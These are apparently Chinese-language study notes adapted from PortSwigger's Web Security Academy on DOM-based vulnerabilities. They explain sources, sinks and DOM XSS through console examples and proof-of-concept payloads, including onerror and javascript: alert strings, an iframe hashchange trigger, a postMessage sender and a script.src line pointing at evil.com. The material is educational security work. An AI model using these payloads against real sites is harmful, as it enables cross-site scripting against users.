# DOM-based 漏洞学习笔记

> 系统化整理自 PortSwigger Web Security Academy，经重新组织与改写，力求在保持技术准确性的前提下提升可读性。

---

## 目录

- [一、基础概念：理解 DOM-based 漏洞](#一基础概念理解-DOM-based-漏洞)
  - [1.1 DOM 与安全](#11-DOM-与安全)
  - [1.2 污点流：源与汇](#12-污点流源与汇)
  - [1.3 常见源一览](#13-常见源一览)
  - [1.4 漏洞类型速查表](#14-漏洞类型速查表)
  - [1.5 教学案例：location.hash 开放重定向](#15-教学案例locationhash-开放重定向)
- [二、代码执行类漏洞](#二代码执行类漏洞)
  - [2.1 DOM-based XSS](#21-DOM-based-XSS)
  - [2.2 JavaScript 注入](#22-JavaScript-注入)
- [三、导航劫持类漏洞](#三导航劫持类漏洞)
  - [3.1 开放重定向](#31-开放重定向)
  - [3.2 链接操控](#32-链接操控)
  - [3.3 WebSocket URL 投毒](#33-WebSocket-URL-投毒)
- [四、数据操控类漏洞](#四数据操控类漏洞)
  - [4.1 Cookie 操控](#41-Cookie-操控)
  - [4.2 HTML5 存储操纵](#42-HTML5-存储操纵)
  - [4.3 DOM 数据操纵](#43-DOM-数据操纵)
  - [4.4 客户端 JSON 注入](#44-客户端-JSON-注入)
- [5.1 document.domain 操控](#51-documentdomain-操控)
  - [背景：同源策略](#背景同源策略)
  - [document.domain 如何放宽同源策略](#documentdomain-如何放宽同源策略)
  - [攻击手法](#攻击手法)
  - [防御](#防御)
- [5.2 Web Message 操控](#52-Web-Message-操控)
  - [postMessage() 的工作机制](#postMessage-的工作机制)
  - [双重角色：postMessage 既是汇也是源](#双重角色postMessage-既是汇也是源)
  - [核心漏洞：缺失或有缺陷的源验证](#核心漏洞缺失或有缺陷的源验证)
  - [源验证绕过技术](#源验证绕过技术)
  - [攻击构造](#攻击构造)
  - [防御：严格的源验证](#防御严格的源验证)
- [5.3 Ajax 请求头操控](#53-Ajax-请求头操控)
  - [XMLHttpRequest.setRequestHeader() 作为 sink](#XMLHttpRequestsetRequestHeader-作为-sink)
  - [CRLF 注入与请求走私](#CRLF-注入与请求走私)
  - [请求头注入与逻辑绕过](#请求头注入与逻辑绕过)
  - [防御](#防御)
- [6.1 客户端 SQL 注入](#61-客户端-SQL-注入)
  - [executeSql() 与 Web SQL](#executeSql-与-Web-SQL)
  - [漏洞代码：字符串拼接](#漏洞代码字符串拼接)
  - [安全代码：参数化查询](#安全代码参数化查询)
- [6.2 客户端 XPath 注入](#62-客户端-XPath-注入)
  - [document.evaluate() 作为 sink](#documentevaluate-作为-sink)
  - [攻击技术](#攻击技术)
  - [XPath 注入 vs SQL 注入对比](#XPath-注入-vs-SQL-注入对比)
  - [防御](#防御)
- [6.3 本地文件路径操纵](#63-本地文件路径操纵)
  - [FileReader API 作为 sink](#FileReader-API-作为-sink)
  - [浏览器沙箱限制](#浏览器沙箱限制)
  - [防御](#防御)
- [7.1 DOM Clobbering](#71-DOM-Clobbering)
  - [核心洞察：HTML 元素如何成为 JavaScript 变量](#核心洞察HTML-元素如何成为-JavaScript-变量)
  - [漏洞模式：`var x = window.x || {}`](#漏洞模式var-x--windowx--)
  - [攻击示例一：基于锚元素的脚本注入](#攻击示例一基于锚元素的脚本注入)
  - [攻击示例二：基于表单的属性覆盖绕过过滤器](#攻击示例二基于表单的属性覆盖绕过过滤器)
  - [防御原则](#防御原则)
- [7.2 拒绝服务（ReDoS）](#72-拒绝服务ReDoS)
  - [灾难性回溯](#灾难性回溯)
  - [漏洞模式：`new RegExp(userInput)`](#漏洞模式new-RegExpuserInput)
  - [经典危险正则模式](#经典危险正则模式)
  - [requestFileSystem() 存储 DoS](#requestFileSystem-存储-DoS)
  - [防御](#防御)
- [8.1 如何测试 DOM-based 漏洞](#81-如何测试-DOM-based-漏洞)
  - [测试 HTML sink](#测试-HTML-sink)
  - [测试 JavaScript 执行 sink](#测试-JavaScript-执行-sink)
  - [浏览器 URL 编码差异](#浏览器-URL-编码差异)
- [8.2 综合防御原则](#82-综合防御原则)
  - [根本原则：不要让不可信数据进入 sink](#根本原则不要让不可信数据进入-sink)
  - [白名单校验 vs 黑名单过滤](#白名单校验-vs-黑名单过滤)
  - [上下文相关的编码](#上下文相关的编码)
  - [使用安全 API](#使用安全-API)
  - [CSP 作为纵深防御](#CSP-作为纵深防御)
  - [DOM Clobbering 专项防御](#DOM-Clobbering-专项防御)

---

# DOM-based 漏洞学习笔记（上）：从原理到利用

## 一、基础概念：理解 DOM-based 漏洞

### 1.1 DOM 与安全

文档对象模型（DOM）是浏览器对 HTML 页面的内部表示。浏览器解析 HTML 后构建一棵节点树，JavaScript 通过这棵树读写页面内容、响应事件。DOM 操作本身是中性工具 -- 现代 Web 应用离开它根本无法运转。问题出在**数据**：当 JavaScript 把攻击者可控的数据传入本不该接收它的危险函数时，漏洞就产生了。

想象一个简单的场景：页面脚本从 URL 参数中读取了一个"回调地址"，然后直接把浏览器重定向过去。用户看到的是合法域名，但跳转的目标却是攻击者的服务器。这就是 DOM-based 漏洞的核心模式 -- 攻击者无法直接修改服务端代码，但可以通过构造 URL 或其他输入，利用客户端 JavaScript 的逻辑缺陷达到目的。

这类漏洞和传统服务端漏洞有本质区别：漏洞代码运行在浏览器中，攻击 payload 可能完全绕过后端。这意味着即使服务端有完善的 WAF 和输入过滤，如果客户端 JavaScript 不安全地处理了数据，攻击仍然可以成功。

### 1.2 污点流：源与汇

理解 DOM-based 漏洞需要一个核心思维模型：**污点流（taint flow）**。这个模型来自信息流安全理论，但概念很直观：

- **源（source）**：攻击者能够控制的数据入口。典型例子是 `location.search`（URL 查询参数）、`document.referrer`（来源页面）、`document.cookie`（cookie 值）、`window.name`（窗口名称）。只要攻击者能够在某种情况下影响这个属性的值，它就是潜在的源。

- **汇（sink）**：危险的执行点。如果攻击者控制的数据流入这里，就会产生安全后果。比如 `eval()` 会将字符串当作代码执行，`document.write()` 会将内容写入页面，`location.href` 赋值会触发导航。

- **污点流**：数据从源流向汇的路径。路径上可能有变量赋值、字符串拼接、条件判断等操作，但只要攻击者可控的数据最终到达了汇并被不安全地使用，漏洞就存在。

判断一个漏洞是否存在的公式很简单：**是否存在一条执行路径，让攻击者可控的数据（源）传播到危险函数（汇）？** 如果答案是"是"，你需要检查路径上是否有充分的验证和净化。

### 1.3 常见源一览（附控制台实际输出）

下面的例子模拟了一个真实的电商场景。假设你正在浏览 `shop.example.com`，当前页面 URL 为：

```
https://shop.example.com/products/search?q=laptop&sort=price#reviews
```

用户搜索了"laptop"，按价格排序，页面滚动到了评论区。以下是在浏览器 DevTools 控制台中依次输入每个源得到的实际返回值。**看到具体输出，比抽象描述有用得多。**

---

#### 第一梯队：URL 相关源（最常用、最易控）

攻击者只需构造一个链接发给受害者，就能完全控制这些值。这是 DOM-based 漏洞最主要的攻击入口。

```javascript
// === 当前页面 URL ===
// https://shop.example.com/products/search?q=laptop&sort=price#reviews

location.search
// 返回： "?q=laptop&sort=price"
// 含义：URL 中 ? 及之后的部分（查询字符串），包含开头的 ?。
// 攻击者控制方式：诱导受害者点击 https://shop.example.com/page?<payload>
// 典型注入点：搜索框、分页参数、排序参数、回调 URL、重定向参数。

location.hash
// 返回： "#reviews"
// 含义：URL 中 # 及之后的部分（片段标识符），包含开头的 #。
// 如果当前 URL 没有 #，则返回空字符串 ""。
// 攻击者控制方式：https://shop.example.com/page#<payload>
// 特别重要：hash 的值根本不会发送到服务端。服务端 WAF、IDS、日志系统全都看不到它。
//   这意味着针对 hash 的 DOM XSS 攻击可以完全绕过所有服务端防护。

location.href
// 返回： "https://shop.example.com/products/search?q=laptop&sort=price#reviews"
// 含义：当前页面的完整 URL 字符串。可读可写 —— 给它赋值会触发浏览器跳转。
// 这是最常用的重定向 sink：location.href = userInput 等同于"跳转到攻击者指定的地址"。

location
// 返回： Location {
//          href: "https://shop.example.com/products/search?q=laptop&sort=price#reviews",
//          origin: "https://shop.example.com",
//          protocol: "https:",
//          host: "shop.example.com",
//          hostname: "shop.example.com",
//          port: "",
//          pathname: "/products/search",
//          search: "?q=laptop&sort=price",
//          hash: "#reviews"
//        }
// 含义：Location 对象，不是字符串。它的每个子属性（search, hash, pathname 等）都是独立的源。
// 常见错误：新手直接比较 location == "某个字符串"，这永远是 false，因为 location 是对象。
//   正确做法是使用 location.href 或 location.toString()。

location.pathname
// 返回： "/products/search"
// 含义：URL 的路径部分（域名之后、? 之前）。
// 攻击者控制方式：某些框架把路径作为参数（如 /user/admin/profile），
//   如果 JS 读取 pathname 后拼接到 innerHTML，可能形成注入。

location.protocol
// 返回： "https:"
// 含义：协议部分（包含冒号）。攻击者一般无法直接控制，但在某些解析漏洞中，
//   如果 JS 拼接 URL 时没有正确区分协议和路径，可能产生意外行为。

location.hostname
// 返回： "shop.example.com"
// 含义：域名部分（不含端口）。攻击者一般无法直接控制，
//   但如果应用使用了通配符子域名且攻击者能注册子域名，情况就不同了。
```

---

#### 第二梯队：文档属性源

这些源来自 `document` 对象，提供关于当前文档的元信息。

```javascript
document.URL
// 返回： "https://shop.example.com/products/search?q=laptop&sort=price#reviews"
// 含义：与 location.href 相同，当前文档的完整 URL 字符串。
// 两者的细微区别：document.URL 可能受 <base> 标签影响。

document.documentURI
// 返回： "https://shop.example.com/products/search?q=laptop&sort=price#reviews"
// 含义：文档的 URI。大多数情况下与 document.URL 一致。
// 区别在于 document.documentURI 是只读的，document.URL 不一定。

document.baseURI
// 返回： "https://shop.example.com/products/search?q=laptop&sort=price#reviews"
// 含义：文档的基础 URI，浏览器用它解析页面中的相对路径。
// 如果页面中存在 <base href="https://evil.com/">，这个值就会变成 "https://evil.com/"，
//   页面中所有的相对路径（如 <img src="/logo.png">）都会被解析到 evil.com。
// 攻击场景：攻击者通过 DOM 注入插入 <base> 标签，劫持所有相对路径的资源请求。
```

---

#### 第三梯队：会话与历史相关源

这些源携带用户的身份信息和浏览痕迹。一旦被攻击者获取，后果严重。

```javascript
document.cookie
// 返回： "session_id=a1b2c3d4e5f6g7h8; cart_id=789; _ga=GA1.2.987654321; preferred_currency=CNY"
// 含义：当前域下所有 cookie 的键值对，用分号+空格分隔。
// 格式固定为 "key1=value1; key2=value2; ..."。
// 作为 source 的攻击场景：
//   攻击者通过 cookie manipulation 漏洞预先植入恶意 cookie 值（比如在 comment 字段中放入
//   <img src=x onerror=alert(1)>），然后页面 JS 读取 document.cookie 并写入 innerHTML，
//   形成"存储型 DOM XSS"——cookie 成了攻击 payload 的载体。
// 作为 sink 的攻击场景：
//   document.cookie = 'role=' + location.hash.slice(1)
//   攻击者构造 #admin，将用户角色 cookie 篡改为 admin，实现权限提升。
// 注意：HttpOnly cookie 不会出现在 document.cookie 中 —— 这是重要的防御机制。

document.referrer
// 返回： "https://www.google.com/search?q=best+laptop+deals&source=web"
// 含义：用户从哪个页面跳转过来的（来源 URL）。上例说明用户通过 Google 搜索进入网站。
// 攻击者控制方式：在自己的页面上放置 <a href="https://victim.com/page">诱饵链接</a>，
//   受害者点击后，victim.com 上的 document.referrer 就是攻击者页面的 URL。
//   攻击者可以在 referrer URL 中编码 payload，然后诱导目标页面的 JS 读取并处理。
// 局限性：HTTPS -> HTTP 跳转时浏览器不发送 referrer；
//   服务端可以通过 Referrer-Policy 响应头控制 referrer 的发送策略。
```

---

#### 第四梯队：持久化存储源

浏览器提供了多种存储机制。攻击者可能通过其他漏洞预先在这些存储中植入恶意数据，然后由页面 JS 读取并触发漏洞 —— 这就是"间接 DOM XSS"。

```javascript
window.name
// 返回： "productViewer_sidebar"
// 含义：窗口的名称，可以通过 window.open() 的第二个参数或 <a target="..."> 设置。
// 这个属性的特殊之处在于：**跨域导航不会自动清除 window.name**。
// 攻击场景（经典的 window.name XSS）：
//   1. 攻击者页面执行：window.open('https://victim.com', '<img src=x onerror=alert(1)>')
//   2. 受害者在弹出的新窗口中访问 victim.com
//   3. victim.com 上的 JS 执行：eval(window.name) 或 innerHTML = window.name
//   4. 攻击者的 payload 在 victim.com 的上下文中执行 —— 完整的 XSS！
// 这个技巧的价值在于：攻击者不需要在 victim.com 上找到反射或存储型注入点，
//   只需要 victim.com 的 JS 有读取 window.name 并传给 sink 的逻辑。

sessionStorage
// 返回： Storage {
//          checkoutStep: "2",
//          shippingMethod: "express",
//          promoCode: "SUMMER2025",
//          length: 3
//        }
// 含义：会话级存储，仅在当前标签页的生命周期内存在。关掉标签页就清空。
// 上例展示了一个电商结账流程中的 sessionStorage —— 存了结账步骤、配送方式、优惠码。
// 攻击场景：如果攻击者能通过其他漏洞向 sessionStorage 写入恶意数据，
//   而页面 JS 在后续步骤中读取这些数据并传给 sink，就形成了攻击链。
//   例如：攻击者将 checkoutStep 改为包含 XSS payload 的字符串，
//   页面在渲染结账步骤时将其写入 innerHTML。

localStorage
// 返回： Storage {
//          recentSearches: '["laptop","wireless mouse","mechanical keyboard"]',
//          theme: "dark",
//          userPreferences: '{"fontSize":"large","notifications":true}',
//          length: 3
//        }
// 含义：持久化存储，关闭浏览器甚至重启电脑都不会清空。
// 上例展示了一个电商网站利用 localStorage 存的搜索历史、主题偏好、用户设置。
// 攻击场景：与 sessionStorage 类似但更危险 —— 因为数据不会消失。
//   攻击者只需污染一次 localStorage（比如通过一次反射型 XSS），
//   受害者在未来任意时间打开网站都可能触发恶意 payload。
//   经典攻击链：反射 XSS（一次性）-> localStorage.setItem（持久化）-> 后续访问触发 DOM XSS。

IndexedDB
// 返回： IDBFactory { ... }
// 含义：浏览器内置的结构化数据库，容量远大于 localStorage（可达数百 MB）。
// 攻击场景：与 localStorage/sessionStorage 类似 —— 如果攻击者能写入恶意数据，
//   而页面 JS 读取后以不安全的方式处理，就可能形成漏洞。
// 实际中 IndexedDB 被很多 PWA 和单页应用用于缓存大量数据（如离线文章、聊天记录）。
```

---

#### 第五梯队：浏览器 API 源

这些源来自浏览器提供的底层 API，攻击者通常通过反射或存储型数据间接控制。

```javascript
history.pushState
// 返回： function pushState() { [native code] }
// 含义：HTML5 History API，可以向浏览器历史添加条目，同时修改地址栏 URL（不触发页面刷新）。
// 调用示例：history.pushState({page: 1}, '', '/search?q=<img src=x onerror=alert(1)>')
// 效果：地址栏显示被篡改的 URL，但页面不刷新。如果页面 JS 后续读取 location.search
//   并根据其值渲染内容，攻击者就间接控制了 source 的值。

history.replaceState
// 返回： function replaceState() { [native code] }
// 含义：与 pushState 相同，但替换当前历史条目而非新增。
// 常用于钓鱼：将地址栏 URL 替换为合法地址，隐藏攻击 payload。

// === Web Message（postMessage）===
// postMessage 不是属性，而是事件机制。攻击者通过其他窗口发送消息，目标页面的
// message 事件监听器接收数据。数据通过 event.data 获取：
//
// window.addEventListener('message', function(e) {
//     console.log(e.data);   // 攻击者通过 postMessage 发送的任意数据
//     console.log(e.origin); // 发送方的源（协议+域名+端口）—— 必须验证！
// });
//
// 攻击者发送端代码（在攻击者控制的页面上）：
// var victimWindow = window.open('https://victim.com/page');
// victimWindow.postMessage('<img src=x onerror=alert(1)>', '*');
//
// 如果 victim.com 的 message 监听器没有验证 e.origin，直接将 e.data 写入 innerHTML，
// 就形成了完整的 DOM XSS。
```

---

#### 总结：源的选择逻辑

在实际测试中按以下优先级依次排查：

1. **先测 URL 源** — `location.search`、`location.hash`、`location.href`。最容易控制，也是出现最多的。给每个参数塞一个独特字符串（如 `test12345`），在 DevTools Elements 面板搜索它出现在哪。
2. **再测存储源** — `localStorage`、`sessionStorage`、`document.cookie`。留意页面 JS 是否从这些位置读取数据后写入 DOM。这种漏洞通常需要攻击链配合。
3. **最后测消息源** — `postMessage`、`window.name`。触发条件较复杂，但在某些场景下是唯一的攻击入口（比如跨域通信场景）。

### 1.4 汇的类型与后果速查表

汇（sink）是危险函数或属性 —— 攻击者可控的数据流到这里就会产生安全后果。下面按**后果严重程度**分类，每个汇标注了"把攻击者数据传给它会怎样"。

---

#### 第一级（严重）：代码执行型 sink

这些 sink 会直接把数据当作代码来执行。**数据进去 = 代码出来。**

| Sink                 | 传入攻击者数据后会发生什么                                                               | 用法示例                                    |
| -------------------- | --------------------------------------------------------------------------- | --------------------------------------- |
| `eval()`             | 字符串被当作 JavaScript 直接执行。相当于给攻击者一个 JS 控制台。                                    | `eval(userInput)`                       |
| `Function()`         | 与 eval 等效，但创建的是新函数。`new Function("return " + x)()` 如果 x 是 `1;alert(1)` 就完了。 | `new Function(userInput)()`             |
| `setTimeout()`       | 第一个参数如果是字符串，会被 eval。`setTimeout("alert(1)", 1000)` 一秒后执行。                   | `setTimeout(userInput, 100)`            |
| `setInterval()`      | 和 setTimeout 一样，但会周期性执行。更加危险 —— 恶意代码每 5 秒跑一次。                               | `setInterval(userInput, 5000)`          |
| `execScript()`       | IE 专有，直接执行字符串为脚本。现代浏览器不存在，但遗留系统可能还在用。                                       | `execScript(userInput)`                 |
| `script.src`         | 加载并执行外部 JS 文件。`script.src = "https://evil.com/payload.js"` —— 完整的 XSS。      | `script.src = userInput`                |
| `script.textContent` | 向 script 元素内写入内联代码。配合 `document.body.appendChild(script)` 会立即执行。            | `script.textContent = userInput`        |
| `element.onevent`    | 注入事件处理器。用户一点击就执行攻击者代码。也可用 `el.onclick = userInput` 直接设置。                    | `el.setAttribute('onclick', userInput)` |

---

#### 第二级（高危）：HTML/DOM 注入型 sink

这些 sink 不会直接执行代码，但会把数据写入页面 HTML。攻击者可以借此注入 `<script>` 或带事件处理器的 HTML 元素。

| Sink                                 | 传入攻击者数据后会发生什么                                                                  | 用法示例                                            |
| ------------------------------------ | ------------------------------------------------------------------------------ | ----------------------------------------------- |
| `document.write()`                   | 将字符串写入文档。如果包含 `<script>alert(1)</script>`，浏览器会执行。                              | `document.write(userInput)`                     |
| `document.writeln()`                 | 与 write 相同，末尾多加一个换行。危险程度一样。                                                    | `document.writeln(userInput)`                   |
| `element.innerHTML`                  | 替换元素的 HTML 内容。注意现代浏览器不会执行 `<script>` 标签，但 `<img src=x onerror=alert(1)>` 仍然有效。 | `el.innerHTML = userInput`                      |
| `element.outerHTML`                  | 连元素自身一起替换。和 innerHTML 的危险程度一样。                                                 | `el.outerHTML = userInput`                      |
| `element.insertAdjacentHTML`         | 在指定位置插入 HTML。所有 innerHTML 的绕过技术同样适用。                                           | `el.insertAdjacentHTML('beforeend', userInput)` |
| `jQuery html()`                      | jQuery 的 HTML 设置方法，内部调用 innerHTML，同样的危险。                                       | `$('#target').html(userInput)`                  |
| `jQuery append/prepend/after/before` | jQuery 的 DOM 插入方法。如果 userInput 包含 HTML 标签，会被解析并插入。                             | `$('#target').append(userInput)`                |
| `range.createContextualFragment()`   | 将字符串解析为 DOM 片段并插入文档。等价于 innerHTML 注入。                                          | `range.createContextualFragment(userInput)`     |

---

#### 第三级（中危）：导航/请求劫持型 sink

数据不会被执行，但会被当作 URL 来处理。攻击者可以劫持用户的浏览器导航或网络请求。

| Sink                                  | 传入攻击者数据后会发生什么                                         | 用法示例                            |
| ------------------------------------- | ----------------------------------------------------- | ------------------------------- |
| `location` / `location.href`          | 浏览器立即跳转到攻击者指定的 URL。最经典的开放重定向 sink。                    | `location = userInput`          |
| `location.host` / `location.hostname` | 修改 URL 的域名部分。`location.host = "evil.com"` 会导致跨域导航。    | `location.host = userInput`     |
| `location.pathname`                   | 修改 URL 路径。可用于构造同源但不同路径的恶意 URL。                        | `location.pathname = userInput` |
| `location.assign()`                   | 与赋值 `location = x` 等效，触发导航。                           | `location.assign(userInput)`    |
| `location.replace()`                  | 与 assign 的区别：不会在浏览器历史中留下记录。`history.back()` 回不去。      | `location.replace(userInput)`   |
| `window.open()`                       | 打开新窗口/标签页。`window.open("https://evil.com")` 直接给攻击者引流。 | `window.open(userInput)`        |
| `element.href`                        | 修改链接目标。`href = "javascript:alert(1)"` 点击后执行 JS。       | `a.href = userInput`            |
| `element.src`                         | 修改资源加载地址。可以跨域发送请求（用于数据外带）。                            | `img.src = userInput`           |
| `element.action`                      | 修改表单提交目标。用户提交表单时，所有数据发送到攻击者服务器。                       | `form.action = userInput`       |
| `WebSocket()`                         | 建立 WebSocket 连接到攻击者控制的服务器，导致数据泄露。                     | `new WebSocket(userInput)`      |
| `XMLHttpRequest.open()`               | 将 Ajax 请求发送到攻击者控制的地址。类似 SSRF。                         | `xhr.open('GET', userInput)`    |
| `XMLHttpRequest.send()`               | 发送 Ajax 请求体，body 内容可被攻击者操控。                           | `xhr.send(userInput)`           |

---

#### 第四级（中低危）：数据/状态修改型 sink

这些 sink 修改浏览器状态或存储的数据，通常需要和其他漏洞组合构成完整攻击链。

| Sink                       | 传入攻击者数据后会发生什么                                                                                            | 用法示例                                       |
| -------------------------- | -------------------------------------------------------------------------------------------------------- | ------------------------------------------ |
| `document.cookie`          | 设置 cookie。攻击者可以进行 session fixation（预先植入已知 token 然后劫持会话）。                                                 | `document.cookie = userInput`              |
| `sessionStorage.setItem()` | 向会话存储写入数据。攻击者植入恶意 payload，等其他代码读取后触发。                                                                    | `sessionStorage.setItem('key', userInput)` |
| `localStorage.setItem()`   | 向持久存储写入数据。比 sessionStorage 更危险 —— 数据不会随标签页关闭而消失。                                                         | `localStorage.setItem('key', userInput)`   |
| `document.domain`          | 修改文档的域名标识。设置后可以绕过同源策略的限制，与攻击者页面交互。                                                                       | `document.domain = userInput`              |
| `history.pushState()`      | 修改地址栏 URL 而不刷新页面。用于钓鱼 —— 地址栏显示合法 URL，实际内容已被篡改。                                                           | `history.pushState({}, '', userInput)`     |
| `history.replaceState()`   | 同上，但替换而非新增历史条目。                                                                                          | `history.replaceState({}, '', userInput)`  |
| `element.setAttribute()`   | 修改任意 DOM 属性。如果属性名和属性值都被控制，可以注入 `onclick=alert(1)`。                                                       | `el.setAttribute(attrName, attrValue)`     |
| `element.value`            | 修改表单输入框的内容。攻击者可以预填充恶意值诱导用户提交。                                                                            | `input.value = userInput`                  |
| `document.title`           | 修改页面标题。可用于钓鱼 —— 把标签页标题改成"安全警告"诱导用户操作。                                                                    | `document.title = userInput`               |
| `element.cssText`          | 注入任意 CSS。CSS 注入可以窃取敏感信息（通过 CSS 选择器 + background-image URL）。                                              | `el.style.cssText = userInput`             |
| `JSON.parse()`             | 解析 JSON 字符串。本身安全，但解析后的对象如果被不安全地使用（如读取某属性后写入 innerHTML），就会产生漏洞。注意这里的漏洞不是 JSON.parse 本身，而是**拼接字符串再解析**的模式。 | `JSON.parse(userInput)`                    |
| `RegExp()`                 | 将攻击者控制的字符串编译为正则表达式。如果模式包含灾难性回溯特征（如 `(a+)+$`），可导致 ReDoS（浏览器卡死）。                                           | `new RegExp(userInput)`                    |
| `document.evaluate()`      | 执行用户控制的 XPath 表达式。攻击者可以注入 `' or '1'='1` 来绕过查询逻辑。                                                         | `document.evaluate(userInput, ...)`        |
| `executeSql()`             | 执行用户控制的 SQL 语句（Web SQL API，已废弃）。`'; DROP TABLE users; --` 是典型的注入 payload。                                | `tx.executeSql(userInput, ...)`            |
| `FileReader.readAsText()`  | 读取用户指定的本地文件。如果文件名来自攻击者可控的源，可能泄露本地文件内容。                                                                   | `reader.readAsText(userControlledFile)`    |
| `requestFileSystem()`      | 请求浏览器的沙盒文件系统空间。如果攻击者控制 size 参数，可以写入大量数据耗尽磁盘配额。                                                           | `requestFileSystem(size)`                  |

---

#### sink 速记：遇到这些函数心里要亮红灯

> 只要看到攻击者可控的数据流向以下任何一个 API，就应当立刻警觉：
>
> **代码执行** `eval` `Function` `setTimeout` `setInterval` `execScript`  
> **DOM 写入** `document.write` `innerHTML` `outerHTML` `insertAdjacentHTML` `jQuery.html` `jQuery.append`  
> **导航跳转** `location` `location.href` `location.assign` `window.open` `a.href`  
> **网络请求** `WebSocket` `XMLHttpRequest.open` `form.action` `img.src` `script.src`  
> **存储修改** `document.cookie` `localStorage.setItem` `sessionStorage.setItem` `document.domain`  
> **查询解析** `JSON.parse` `RegExp` `document.evaluate` `executeSql` `FileReader`

### 1.5 教学案例：location.hash 开放重定向

下面这段代码是理解 DOM-based 漏洞最经典的入门示例。只有六行，但包含了完整的污点流：

```javascript
goto = location.hash.slice(1)
if (goto.startsWith('https:')) {
  location = goto;
}
```

**代码解释：** `location.hash` 是 source -- 攻击者可以通过构造 URL 来控制 `#` 之后的内容。`location`（即 `window.location`）是 sink -- 给这个属性赋值会导致浏览器立即跳转。代码的逻辑是：从 URL hash 中提取内容（去掉 `#`），如果它以 `https:` 开头，就将浏览器重定向到该地址。问题在于：它只检查了协议前缀，没有对目标域名做任何限制。攻击者构造 `https://victim.com#https://evil.com`，受害者看到的是合法域名和 TLS 证书，但 JavaScript 执行后自动跳转到钓鱼网站。整个数据流是：`location.hash` (attacker-controlled source) -> `slice(1)` -> `startsWith` 检查（不充分的验证）-> `location` (dangerous sink)。

这个例子揭示了 DOM-based 漏洞的典型特征：**验证不充分**。开发者知道不能把任意 URL 赋给 `location`，所以加了协议检查。但这个检查只回答了"是 HTTPS 吗？"，没有回答"目标域名可信吗？"。攻击者正是利用了这种**部分验证**的缝隙。

---

## 二、代码执行类漏洞

代码执行是 DOM-based 漏洞中最危险的一类。它们的共同特征是：攻击者可控的数据最终被浏览器当作代码来执行。这包括两种主要形式：**DOM XSS**（将恶意 HTML/JavaScript 注入页面 DOM）和 **JavaScript 注入**（直接向代码执行函数传入攻击者控制的字符串）。两者的本质都是"数据变成了代码"，区别在于注入的入口和利用方式。

### 2.1 DOM-based XSS

#### 什么是 DOM XSS

DOM-based 跨站脚本（DOM XSS）发生在 JavaScript 从攻击者可控的源（如 URL）读取数据，然后将其传递给支持动态代码执行的汇（如 `eval()` 或 `innerHTML`）时。

DOM XSS 与传统的反射型/存储型 XSS 的关键区别在于**执行位置**。传统 XSS 中，恶意脚本在服务端被嵌入 HTML 响应，浏览器收到后执行。DOM XSS 则完全不同：服务端响应本身可能完全"干净"，恶意脚本是通过客户端 JavaScript 在浏览器运行过程中动态引入的。这意味着：

- 服务端的输入过滤对 DOM XSS 无效，因为 payload 可能根本不经过后端。
- 查看"页面源代码"无法检测 DOM XSS，因为恶意代码是在运行时通过 JavaScript 插入 DOM 的。
- 漏洞的根源只能在客户端的 JavaScript 代码中找到。

#### document.write() 汇

`document.write()` 是 DOM XSS 最经典的 sink。它将字符串直接写入 HTML 文档，浏览器会立即解析并执行其中的 `<script>` 标签：

```javascript
document.write('... <script>alert(document.domain)</script> ...');
```

**代码解释：** `document.write()` 直接将字符串写入 HTML 文档。如果写入的内容包含 `<script>` 标签，浏览器会立即解析并执行其中的 JavaScript。攻击者需要构造 payload 使得自己的代码出现在 `document.write()` 的参数中。注意：在某些情况下 `document.write()` 写入的内容有上下文（比如已经打开的 HTML 标签），攻击者需要先用 `</tag>` 闭合现有元素，再插入自己的 payload。

#### innerHTML 汇

`innerHTML` 是现代 Web 应用中使用频率极高的 DOM 操作方式。但与 `document.write()` 不同，现代浏览器中通过 `innerHTML` 插入的 `<script>` 标签不会被自动执行 -- 这是 HTML5 规范的安全设计。攻击者需要换一个思路：

```javascript
element.innerHTML = '... <img src=1 onerror=alert(document.domain)> ...';
```

**代码解释：** `innerHTML` 与 `document.write()` 不同，在现代浏览器中，通过 `innerHTML` 插入的 `<script>` 标签不会被自动执行（这是 HTML5 规范的安全设计）。因此攻击者需要使用替代方案：带有事件处理器的元素，如 `<img src=1 onerror=alert(1)>` 或 `<iframe onload=alert(1)>`。`src=1` 是一个不存在的图片地址，浏览器加载失败后触发 `onerror` 事件，从而执行攻击者的 JavaScript。

#### jQuery 中的 DOM XSS

jQuery 的广泛使用带来了两个需要特别关注的攻击面。

**`attr()` 方法操控 `href`：**

```javascript
$(function() {
    $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnUrl'));
});
```

**代码解释：** 这段 jQuery 代码从 URL 查询参数 `returnUrl` 中读取值，然后通过 `attr()` 方法设置 `#backLink` 元素的 `href` 属性。source 是 `window.location.search`（即 URL 中 `?` 之后的部分），sink 是 `attr("href", ...)`。虽然这不会立即执行 JavaScript，但攻击者可以构造 `?returnUrl=javascript:alert(document.domain)`，当用户点击这个"返回链接"时，`javascript:` 伪协议就会在浏览器中执行嵌入的代码。这是一个典型的 DOM XSS -- 数据从 URL 流入 DOM 属性，在用户交互触发后执行。

**`$()` 选择器与 hashchange -- 经典漏洞：**

早期 jQuery 版本中，`$()` 选择器函数如果发现字符串内容看起来像 HTML，会创建对应的 DOM 元素。当它与 `location.hash` 结合时，就产生了以下典型漏洞：

```javascript
$(window).on('hashchange', function() {
    var element = $(location.hash);
    element[0].scrollIntoView();
});
```

**代码解释：** 这段代码是早期 jQuery 版本中常见的 DOM XSS 漏洞模式。`hashchange` 事件在 URL 的 hash 部分（`#` 之后）发生变化时触发。`$(location.hash)` 使用 jQuery 的 `$()` 选择器引擎解析 hash 内容 -- 问题是旧版 jQuery 如果发现 hash 内容看起来像 HTML（比如包含 `<img>` 标签），会创建对应的 DOM 元素，从而导致 XSS。例如，攻击者构造 `#<img src=1 onerror=alert(1)>`，jQuery 会解析并创建这个 `<img>` 元素，`onerror` 事件触发后执行 JavaScript。攻击者可以通过 `<iframe>` 的 `onload` 事件动态修改 hash 来触发 `hashchange`，无需用户交互。

无需用户交互的利用方式 -- 通过 `iframe` 触发 `hashchange`：

```html
<iframe src="https://vulnerable-website.com#" onload="this.src+='<img src=1 onerror=alert(1)>'">
```

